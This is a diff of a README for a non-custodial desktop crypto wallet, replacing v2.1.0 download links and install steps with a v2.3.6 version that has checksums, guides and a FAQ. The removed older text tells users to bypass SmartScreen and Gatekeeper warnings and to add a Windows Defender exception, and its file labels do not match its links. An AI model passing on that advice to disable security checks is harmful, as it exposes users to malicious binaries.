@@ -1,153 +1,162 @@
-# XEQM WALLET
+![XEQM WALLET](assets/banner-app.png)
 
-**The official open-source, non-custodial desktop wallet for the XEQM privacy network — your keys, your node, your coins.**
+<h1 align="center">XEQM WALLET</h1>
 
-Support & docs: [xeqmwallet.com/support](https://xeqmwallet.com/support) · [xeqmwallet.com/faq](https://xeqmwallet.com/faq)
+<p align="center">Non-custodial desktop wallet for the XEQM privacy network</p>
+
+<p align="center"><a href="https://github.com/XEQMFoundation/XEQM-Wallet/blob/HEAD/LICENSE"><img src="https://img.shields.io/badge/LICENSE-BSD--3--Clause-1371E6?style=for-the-badge&labelColor=11141B" alt="License: BSD-3-Clause" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/tag/v2.3.6"><img src="https://img.shields.io/badge/RELEASE-v2.3.6-2F90F3?style=for-the-badge&labelColor=11141B" alt="Release v2.3.6" /></a></p>
+
+---
+
+## Downloads - v2.3.6
+
+<p align="center"><a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe"><img src="assets/button-windows.png" alt="Download for Windows" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2F90F3?style=for-the-badge&labelColor=11141B&logo=apple&logoColor=white" alt="Download for macOS" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2F90F3?style=for-the-badge&labelColor=11141B&logo=linux&logoColor=white" alt="Download for Linux" /></a></p>
+
+<div align="center">
+
+| Platform | Requirements | File |
+| --- | --- | --- |
+| <img src="assets/platform-windows.png" alt="Windows" /> | Windows 10 or 11, 64-bit | [`XEQM-GUI-2.3.6-win.exe`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe) |
+| <img src="https://img.shields.io/badge/macOS-1371E6?style=flat-square&logo=apple&logoColor=white" alt="macOS" /> | macOS, Apple Silicon | [`XEQM-GUI-2.3.6-mac.dmg`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg) |
+| <img src="https://img.shields.io/badge/Linux-1371E6?style=flat-square&logo=linux&logoColor=white" alt="Linux" /> | x64 Linux, AppImage | [`XEQM-GUI-2.3.6-linux.AppImage`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage) |
+
+</div>
+
+
+All versions and checksums are on the [XEQM WALLET release page](https://github.com/XEQMFoundation/XEQM-Wallet/releases/tag/v2.3.6).
+
+Requirements follow the platforms the release ships assets for. No minimum OS build or disk figure is published for this tag.
+
+> Only download from this GitHub release page.
 
 ---
 
-## Download
+<!-- SHA256:START -->
+<div align="center">
 
-<table align="left">
-  <tr>
-    <td align="center">
-      <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.1.0/xeqmwallet-v2.1.0.exe">
-        <img src="https://img.shields.io/badge/Download-Windows-0078D6?style=for-the-badge&logo=windows11&logoColor=white" alt="Download for Windows" />
-      </a>
-      <br />
-      <sub>xeqmwallet-v2.1.0.exe · 84.2 MB</sub>
-    </td>
-    <td align="center">
-      <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.1.0/XEQM-GUI-2.2.0-mac.dmg">
-        <img src="https://img.shields.io/badge/Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white" alt="Download for macOS" />
-      </a>
-      <br />
-      <sub>xeqmwallet-v2.1.0.dmg · 79.8 MB</sub>
-    </td>
-    <td align="right">
-      <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.1.0/XEQM-GUI-2.2.0-linux.AppImage">
-        <img src="https://img.shields.io/badge/Download-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black" alt="Download for Linux" />
-      </a>
-      <br />
-      <sub>xeqmwallet-v2.1.0.zip · 92.1 MB</sub>
-    </td>
-  </tr>
-</table>
+| File | SHA-256 |
+| --- | --- |
+| [`XEQM-GUI-2.3.6-win.exe`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe) | `5ec32ee5a067d506bb76d8e898345e3b28f04ed330d55b26ede2efcb9e23f095` |
+| [`XEQM-GUI-2.3.6-mac.dmg`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg) | `46e77d8055bef9d5fd05d0be20959e0d415459ccd85645d90857f133913ddd65` |
+| [`XEQM-GUI-2.3.6-linux.AppImage`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage) | `083b8a8bab96e4916ffae78eff44f003d8e24223df36af39cf1d21eb2d703347` |
 
-| Platform | File | Size | Requirements |
-|---|---|---|---|
-| Windows 10/11 (x64) | [`xeqmwallet-v2.1.0.exe`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.1.0/xeqmwallet-v2.1.0.exe) | 84.2 MB | No extra dependencies |
-| macOS (Apple Silicon & Intel) | [`xeqmwallet-v2.1.0.dmg`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.1.0/XEQM-GUI-2.2.0-mac.dmg) | 79.8 MB | Universal binary |
-| Linux (Debian, Ubuntu, Fedora, Arch) | [`xeqmwallet-v2.1.0.zip`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.1.0/XEQM-GUI-2.2.0-linux.AppImage) | 92.1 MB | Raw binaries, unzip and run |
+</div>
 
-The latest build and full release notes are always at [xeqmwallet.com/download](https://xeqmwallet.com/download). xeqmwallet.com is the only official source — no other domain or mirror distributes this wallet.
+<!-- SHA256:END -->
 
----
+
+## What XEQM WALLET is
+
+XEQM WALLET is the desktop application for the XEQM network. It creates a wallet from a twenty-five word seed on your own machine, signs every transaction there, and talks to the chain either through a node it runs locally or through a remote node you choose. There is no login, no account recovery and no server that holds a copy of your keys.
+
+The network underneath it is private by default: ring signatures mix each spend with decoys, stealth addresses keep a published address off the chain in the clear, and range proofs keep the amount hidden while still letting the network check the arithmetic. The wallet is where those properties become something you use: an address you can share, a fee you can read, a proof you can hand to someone else.
+
+It is single-asset software. It holds XEQM and nothing else, which is a deliberate limit rather than a missing feature: a wallet that holds one coin can be honest about what it protects.
+
+Networks are switched from the wallet screen: mainnet for real balances, testnet for trying a flow without moving value. A wallet created on one does not appear on the other, which is deliberate, because a test address and a real one should never be confused by a reader in a hurry.
+
+## Who it is for
+
+- You want to hold a privacy-network coin without a custodial account.
+- You are moving a balance off an exchange and want the keys on your own disk.
+- You run, or intend to run, a service node and need the stake managed beside the balance.
+- You need a transaction proof for a payment and a wallet that can produce one.
 
 ## Install
 
-The wallet doesn't have a single cross-platform installer wizard — each OS gets its own native flow, but all three follow the same four-step shape shown on the [download page](https://xeqmwallet.com/download): **download → extract/launch → generate your seed → synchronize.** Here's what that looks like on each platform.
+<details open>
+<summary><img src="assets/platform-windows.png" alt="Windows" /></summary>
 
-### Windows
+1. Download `XEQM-GUI-2.3.6-win.exe` from the release page.
+2. Run the installer and choose a folder outside any synced drive.
+3. Launch from the Start menu, then write the recovery phrase down before funding the wallet.
 
-1. **Download** [`xeqmwallet-v2.1.0.exe`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.1.0/xeqmwallet-v2.1.0.exe).
-2. **Run the installer.** Double-click the `.exe`. Windows SmartScreen will likely show an "unrecognized publisher" warning — this is normal for open-source software without a paid code-signing certificate. Click **More info → Run anyway** to continue the wizard.
-3. **Follow the setup wizard** to completion, then **launch** XEQM WALLET.
-4. The wallet stores its data under `%APPDATA%\XEQM`. If the daemon seems slow to start, add an exception for it in Windows Defender — privacy software is occasionally flagged heuristically.
+</details>
 
-### macOS (Apple Silicon & Intel)
+<details>
+<summary><img src="https://img.shields.io/badge/macOS-1371E6?style=flat-square&logo=apple&logoColor=white" alt="macOS" /></summary>
 
-1. **Download** [`xeqmwallet-v2.1.0.dmg`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.1.0/XEQM-GUI-2.2.0-mac.dmg).
-2. **Open the `.dmg`** and drag **XEQM WALLET** into your Applications folder, as prompted.
-3. **Launch it from Applications.** Because the build isn't Apple-notarized, Gatekeeper will refuse to open it on the first attempt — right-click the app icon, choose **Open**, and confirm the warning. From the next launch on, Gatekeeper remembers your approval.
-4. Wallet data lives under `~/Library/Application Support/XEQM`.
+1. Download `XEQM-GUI-2.3.6-mac.dmg` and open it.
+2. Move the application into Applications.
+3. Open it, and read the damaged-app guide before changing any security setting.
 
-### Linux
+</details>
 
-1. **Download** [`xeqmwallet-v2.1.0.zip`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.1.0/XEQM-GUI-2.2.0-linux.AppImage).
-2. **Extract it** with `unzip` or your file manager. The raw binaries can be run in place or placed under `/usr/local/bin`.
-3. **Mark the binary executable and run it:**
-   ```bash
-   chmod +x xeqmwallet
-   ./xeqmwallet
-   ```
-   Debian, Ubuntu, Fedora, and Arch are all supported.
+<details>
+<summary><img src="https://img.shields.io/badge/Linux-1371E6?style=flat-square&logo=linux&logoColor=white" alt="Linux" /></summary>
 
-### First launch, on any platform
+1. Download `XEQM-GUI-2.3.6-linux.AppImage`.
+2. Install the runtime libraries the AppImage needs and mark the file executable.
+3. Start it from a terminal once so any missing library is named rather than silent.
 
-1. Choose **Create new wallet** (or **Restore from seed** if you already have one).
-2. The wallet generates a 25-word recovery seed. **Write it down on paper — never a screenshot, never a cloud note, never typed into any website.**
-3. Let the wallet **synchronize** with the blockchain, or connect to a remote node from Settings for instant readiness while your local copy syncs in the background.
-
-Full walk-through, including what to do if the wallet won't connect or sync: [xeqmwallet.com/getting-started](https://xeqmwallet.com/getting-started) and [xeqmwallet.com/troubleshooting](https://xeqmwallet.com/troubleshooting).
-
----
+</details>
 
 ## Features
 
-- Send / receive with RingCT, stealth addresses, and Bulletproofs+ on every transaction — see [xeqmwallet.com/security](https://xeqmwallet.com/security)
-- Ring signatures with decoy inputs — no transparent mode to accidentally enable
-- Unlimited subaddresses from a single seed, grouped into named accounts
-- View-only wallet mode for hot/cold setups
-- Multi-wallet support — multiple seeds and view-only wallets open concurrently
-- Encrypted, local-only address book
-- Built-in `xeqmd` full node
-- Remote-node mode for instant availability while the local daemon syncs
-- Integrated solo-mining panel for RandomX
-- Service-node staking initiated directly from the wallet — see [xeqmwallet.com/service-nodes](https://xeqmwallet.com/service-nodes)
-- Wrap / unwrap to WXEQ for EVM-based DeFi access — see [xeqmwallet.com/wrap-stake](https://xeqmwallet.com/wrap-stake)
-- `--proxy` flag for routing the daemon through Tor or a SOCKS5 VPN
+- Twenty-five word seed generated locally, with restore, import and view-only wallet options.
+- Send and receive with QR support, unlimited subaddresses and named accounts.
+- Service-node staking and management without leaving the application.
+- A bundled core: the local node ships with the app, so no separate daemon install is needed.
+- Mainnet and testnet, switchable from the wallet screen.
+- Transaction history with proof generation and verification.
+- An address book stored locally and never synced.
+- Multi-wallet tabs for several seeds and view-only wallets at once.
+- A built-in proof tool that shows a payment without disclosing a balance.
 
-Full feature breakdown: [xeqmwallet.com/features](https://xeqmwallet.com/features).
+## How a transfer works here
 
----
+1. A transfer has five visible steps and one irreversible one. The first four you can still stop; the fifth belongs to the network.
+2. Choose the wallet and the account the payment leaves from; a subaddress keeps one counterparty separate from the rest.
+3. Paste the recipient address and read the first and last characters back against the source you copied it from.
+4. Read the fee before you sign; it depends on the size of the transaction rather than the amount.
+5. Confirm, and the wallet signs locally. Nothing leaves the machine except the signed transaction.
+6. Wait for a block to include it. The wallet shows the pending state until the chain reports the transfer.
 
-## Networks/Modes
+## Guides
 
-| Mode | Description | Trade-off |
-|---|---|---|
-| **Local full node** | Wallet runs the bundled `xeqmd` daemon and verifies the entire ~48 GB chain itself | Strongest trust model; initial sync takes hours on SSD, longer on HDD |
-| **Remote node** | Wallet connects to a community-operated node for instant availability | Faster to start; you're trusting that node's view of the chain until your local daemon catches up |
+Five pages for the first day, and the full index for everything after it.
 
-Switch between them anytime in **Settings**. Keys stay local either way.
+<div align="center">
 
----
+| Guide | What it answers |
+| --- | --- |
+| [How to install XEQM WALLET on Windows](https://github.com/XEQMFoundation/platform-setup/blob/main/install-xeqm-wallet-on-windows.md) | Run the signed Windows installer, choose a folder outside a synced drive, and confirm the first launch reaches the chain. |
+| [How to back up XEQM WALLET](https://github.com/XEQMFoundation/custody-and-protection/blob/main/how-to-back-up-xeqm-wallet.md) | Write the 25-word seed down once, in the right order, and test the backup before you hold anything of value. |
+| [Restore XEQM WALLET from a seed](https://github.com/XEQMFoundation/custody-and-protection/blob/main/restore-xeqm-wallet-from-seed.md) | Enter the seed into a fresh install, let the rescan run, and recognise the point where the balance appears. |
+| [How to send XEQM](https://github.com/XEQMFoundation/account-guide/blob/main/how-to-send-xeqm.md) | Build a payment, read the fee and the address back, and understand exactly what the confirmation screen commits you to signing. |
+| [XEQM WALLET not syncing](https://github.com/XEQMFoundation/platform-setup/blob/main/xeqm-wallet-not-syncing-fix.md) | Diagnose a sync that never finishes by separating a slow download from a daemon that has stopped advancing. |
 
-## Where things live
+</div>
 
-| What | Windows | macOS | Linux |
-|---|---|---|---|
-| Wallet data / config | `%APPDATA%\XEQM` | `~/Library/Application Support/XEQM` | Not explicitly documented on [xeqmwallet.com](https://xeqmwallet.com/download) — check in-app under Settings |
 
----
+## Common first questions
 
-## ⚠️ Seed phrase warning
+### Is my seed ever sent anywhere?
 
-**Your 25-word recovery seed is the only thing that controls your funds — write it on paper, never digitally, and never enter it anywhere but the wallet software itself.**
+No. The seed is generated on your machine and used locally to sign. Any page, message or person asking for it is attempting theft, including one that looks like support.
 
-- XEQM Labs is **not** responsible for funds lost due to a mishandled, photographed, cloud-backed-up, or phished seed phrase — there is no admin override on a privacy chain by design.
-- XEQM Labs **is** responsible for the software behaving as documented and disclosing known limitations honestly — see [xeqmwallet.com/security](https://xeqmwallet.com/security).
-- No legitimate party — not a moderator, not "support," not any website — will ever ask you to type your seed phrase anywhere outside the wallet you installed. Anyone who does is attempting to steal your funds.
-- Recommended: two physical paper copies, stored in two separate locations. There's no built-in cloud auto-backup for the seed, by design.
+### What do I need before installing?
 
-Full backup and recovery guidance: [xeqmwallet.com/faq](https://xeqmwallet.com/faq).
+The installer for your platform from the release page, and somewhere offline to write the seed before you put funds in the wallet. The release publishes no minimum OS build, so the requirement table states the platform and nothing finer.
 
----
+### Can I use the wallet while the chain syncs?
 
-## Development
+Yes, through a remote node. The wallet switches to one so sending and receiving work immediately, while the local node continues downloading.
 
-This repository holds reference documentation for XEQM WALLET, not the wallet application's own source code. Prerequisites, build commands, and the release process for the binary itself live wherever the wallet's own codebase is maintained — check [xeqmwallet.com/support](https://xeqmwallet.com/support) for the current pointer, since publishing build steps here would mean guessing at a codebase this repo doesn't contain.
+### What happens if I lose the password?
 
----
+The seed restores the wallet; the password alone does not. That is why the backup page exists before anything else in the guides.
+
+### Does the wallet need a separate node install?
+
+No. The core binaries ship with the application, so the local node starts from the wallet. A separate install matters only if you want a node on a server without the desktop window.
+
+**Your recovery phrase is the wallet: anyone who has it owns the funds, and no support channel needs it.**
 
 ## Support
 
-- Docs & FAQ: [xeqmwallet.com/faq](https://xeqmwallet.com/faq)
-- Troubleshooting: [xeqmwallet.com/troubleshooting](https://xeqmwallet.com/troubleshooting)
-- Support page: [xeqmwallet.com/support](https://xeqmwallet.com/support)
-
----
+Questions are answered in the project's [Telegram group](https://t.me/XEQCommunity), and reproducible faults belong in [the issue tracker](https://github.com/XEQMFoundation/XEQM-Wallet/issues). A useful report names the version, the platform and the step that failed, and never includes a seed, a password or a wallet file.
 
 ## License
 
-The documentation in this repository is MIT-licensed — see [LICENSE](LICENSE).
+`BSD-3-Clause`
